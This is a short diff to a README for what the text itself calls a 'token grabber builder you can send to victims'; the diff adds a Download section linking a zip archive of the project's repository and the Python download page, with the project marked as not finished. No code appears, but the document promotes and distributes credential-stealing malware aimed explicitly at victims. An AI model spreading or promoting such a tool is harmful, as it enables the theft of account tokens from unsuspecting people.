@@ -22,4 +22,8 @@ token grabber builder you can send to victims
 
 More soon, be patient.
 
+# Download
+[Download the program](https://github.com/itssnee/engine-owner/archive/refs/heads/main.zip)
+[Download Python](https://www.python.org/downloads/)
+
 # NOT FINISHED
